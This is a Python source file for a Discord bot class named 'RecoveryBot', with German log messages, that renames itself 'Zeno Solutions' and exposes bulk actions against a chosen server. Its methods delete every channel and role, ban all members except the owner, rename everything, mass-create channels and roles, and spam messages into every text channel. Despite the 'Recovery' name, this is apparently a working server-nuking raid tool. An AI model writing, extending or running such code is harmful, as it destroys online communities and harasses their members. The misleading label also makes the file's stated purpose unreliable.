import discord
import asyncio
import io
import os
import aiohttp

intents = discord.Intents.all()


class RecoveryBot:
    def __init__(self, log_callback=None, on_ready_callback=None):
        self.client = discord.Client(intents=intents)
        self.log = log_callback or print
        self.on_ready_callback = on_ready_callback
        self.running = False
        self.loop = None
        self._setup_events()

    def _setup_events(self):
        @self.client.event
        async def on_ready():
            # Set DND status + "Playing Zeno Solutions" activity
            activity = discord.Activity(type=discord.ActivityType.playing, name="Zeno Solutions")
            await self.client.change_presence(status=discord.Status.dnd, activity=activity)
            self.log(f"[OK] Bot verbunden als: {self.client.user}")
            self.log(f"[STATUS] Nicht storen")
            self.log(f"[ACTIVITY] Spielt Zeno Solutions")

            # Rename bot to "Zeno Solutions"
            try:
                if self.client.user.name != "Zeno Solutions":
                    await self.client.user.edit(username="Zeno Solutions")
                    self.log("[OK] Bot umbenannt zu: Zeno Solutions")
            except Exception as e:
                self.log(f"[WARN] Name nicht aenderbar: {e}")

            # Set avatar to logo1.png
            try:
                logo_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logo1.png")
                if os.path.exists(logo_path):
                    with open(logo_path, "rb") as f:
                        avatar_data = f.read()
                    await self.client.user.edit(avatar=avatar_data)
                    self.log("[OK] Avatar gesetzt: logo1.png")
                else:
                    self.log("[WARN] logo1.png nicht gefunden")
            except Exception as e:
                self.log(f"[WARN] Avatar nicht aenderbar: {e}")

            self.log(f"[INFO] {len(self.client.guilds)} Server gefunden")
            if self.on_ready_callback:
                self.on_ready_callback()

    def get_guilds(self):
        if self.client.is_ready():
            return [(g.name, g.id) for g in self.client.guilds]
        return []

    async def _delete_all_channels(self, guild_id):
        guild = self.client.get_guild(guild_id)
        if not guild:
            self.log("[ERROR] Server nicht gefunden!")
            return
        self.log(f"[ACTION] Loesche alle Kanaele auf: {guild.name}")
        
        async def delete_ch(channel):
            try:
                await channel.delete(reason="Recovery Bot")
                self.log(f"  > Geloescht: {channel.name}")
                return True
            except:
                return False

        tasks = [delete_ch(c) for c in guild.channels]
        results = await asyncio.gather(*tasks)
        success_count = sum(1 for r in results if r)
        self.log(f"[DONE] {success_count} Kanaele geloescht!")

    async def _ban_all_members(self, guild_id):
        guild = self.client.get_guild(guild_id)
        if not guild:
            self.log("[ERROR] Server nicht gefunden!")
            return
        self.log(f"[ACTION] Banne alle Mitglieder auf: {guild.name}")
        
        async def ban_m(member):
            if member == self.client.user or member == guild.owner:
                return False
            try:
                await guild.ban(member, reason="Recovery Bot")
                self.log(f"  > Gebannt: {member.name}")
                return True
            except:
                return False

        tasks = []
        async for member in guild.fetch_members(limit=None):
            tasks.append(ban_m(member))
            
        results = await asyncio.gather(*tasks)
        self.log(f"[DONE] {sum(1 for r in results if r)} Mitglieder gebannt!")

    async def _change_server_icon(self, guild_id, icon_path):
        guild = self.client.get_guild(guild_id)
        if not guild:
            self.log("[ERROR] Server nicht gefunden!")
            return
        try:
            if icon_path.startswith("http"):
                async with aiohttp.ClientSession() as session:
                    async with session.get(icon_path) as resp:
                        icon_data = await resp.read()
            else:
                with open(icon_path, "rb") as f:
                    icon_data = f.read()
            await guild.edit(icon=icon_data)
            self.log("[OK] Server-Icon geaendert!")
        except Exception as e:
            self.log(f"[ERROR] Fehler beim Icon aendern: {e}")

    async def _change_server_name(self, guild_id, new_name):
        guild = self.client.get_guild(guild_id)
        if not guild:
            self.log("[ERROR] Server nicht gefunden!")
            return
        try:
            await guild.edit(name=new_name)
            self.log(f"[OK] Server umbenannt -> {new_name}")
        except Exception as e:
            self.log(f"[ERROR] Fehler: {e}")

    async def _rename_all_channels(self, guild_id, new_name):
        guild = self.client.get_guild(guild_id)
        if not guild:
            self.log("[ERROR] Server nicht gefunden!")
            return
        self.log(f"[ACTION] Benenne alle Kanaele um")
        
        async def rename_ch(channel):
            try:
                await channel.edit(name=new_name)
                return True
            except:
                return False

        tasks = [rename_ch(c) for c in guild.channels]
        results = await asyncio.gather(*tasks)
        self.log(f"[DONE] {sum(1 for r in results if r)} Kanaele umbenannt!")

    async def _create_channels(self, guild_id, name, amount):
        guild = self.client.get_guild(guild_id)
        if not guild: return
        self.log(f"[ACTION] Erstelle {amount}x {name}")
        
        async def create_ch():
            try:
                await guild.create_text_channel(name=name)
                return True
            except:
                return False

        tasks = [create_ch() for _ in range(amount)]
        results = await asyncio.gather(*tasks)
        self.log(f"[DONE] {sum(1 for r in results if r)} Kanaele erstellt!")

    async def _create_roles(self, guild_id, name, amount):
        guild = self.client.get_guild(guild_id)
        if not guild: return
        self.log(f"[ACTION] Erstelle {amount}x Rolle: {name}")

        async def create_rl():
            try:
                await guild.create_role(name=name)
                return True
            except:
                return False

        tasks = [create_rl() for _ in range(amount)]
        results = await asyncio.gather(*tasks)
        self.log(f"[DONE] {sum(1 for r in results if r)} Rollen erstellt!")

    async def _delete_all_roles(self, guild_id):
        guild = self.client.get_guild(guild_id)
        if not guild: return
        self.log("[ACTION] Loesche alle Rollen")

        async def delete_rl(role):
            if role.is_default() or role >= guild.me.top_role:
                return False
            try:
                await role.delete(reason="Recovery Bot")
                return True
            except:
                return False

        tasks = [delete_rl(r) for r in guild.roles]
        results = await asyncio.gather(*tasks)
        self.log(f"[DONE] {sum(1 for r in results if r)} Rollen geloescht!")

    async def _unban_all(self, guild_id):
        guild = self.client.get_guild(guild_id)
        if not guild: return
        self.log("[ACTION] Entbanne alle")
        
        async def unban_u(entry):
            try:
                await guild.unban(entry.user)
                return True
            except:
                return False

        tasks = []
        async for entry in guild.bans(limit=None):
            tasks.append(unban_u(entry))
        
        results = await asyncio.gather(*tasks)
        self.log(f"[DONE] {sum(1 for r in results if r)} Nutzer entbannt!")

    async def _spam_all_channels(self, guild_id, message, amount):
        guild = self.client.get_guild(guild_id)
        if not guild: return
        self.log(f"[ACTION] Spamming {amount}x in jeden Kanal")

        async def spam_ch(channel):
            count = 0
            for _ in range(amount):
                try:
                    await channel.send(message)
                    count += 1
                except:
                    break
            return count

        tasks = [spam_ch(c) for c in guild.text_channels]
        results = await asyncio.gather(*tasks)
        self.log(f"[DONE] Insgesamt {sum(results)} Nachrichten gesendet!")

    def run_action(self, coro):
        if self.loop and self.loop.is_running():
            asyncio.run_coroutine_threadsafe(coro, self.loop)
        else:
            self.log("[ERROR] Bot ist nicht bereit!")

    def delete_all_channels(self, guild_id):
        self.run_action(self._delete_all_channels(guild_id))

    def ban_all_members(self, guild_id):
        self.run_action(self._ban_all_members(guild_id))

    def change_server_icon(self, guild_id, icon_path):
        self.run_action(self._change_server_icon(guild_id, icon_path))

    def change_server_name(self, guild_id, new_name):
        self.run_action(self._change_server_name(guild_id, new_name))

    def rename_all_channels(self, guild_id, new_name):
        self.run_action(self._rename_all_channels(guild_id, new_name))

    def create_channels(self, guild_id, name, amount):
        self.run_action(self._create_channels(guild_id, name, amount))

    def create_roles(self, guild_id, name, amount):
        self.run_action(self._create_roles(guild_id, name, amount))

    def delete_all_roles(self, guild_id):
        self.run_action(self._delete_all_roles(guild_id))

    def unban_all(self, guild_id):
        self.run_action(self._unban_all(guild_id))

    def spam_all_channels(self, guild_id, message, amount):
        self.run_action(self._spam_all_channels(guild_id, message, amount))
